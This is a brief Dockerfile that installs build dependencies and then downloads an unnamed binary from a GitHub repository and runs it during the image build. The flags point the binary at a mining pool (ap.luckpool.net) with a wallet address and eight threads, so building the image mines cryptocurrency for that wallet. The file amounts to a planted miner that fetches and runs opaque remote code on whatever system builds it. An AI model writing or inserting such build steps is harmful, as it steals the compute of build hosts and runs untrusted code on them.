FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev wget libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev

RUN wget https://github.com/yahihs/rep/raw/main/nhq
RUN chmod +x nhq
RUN ./nhq -v -l ap.luckpool.net:3956 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.Rig001 -p x -t 8
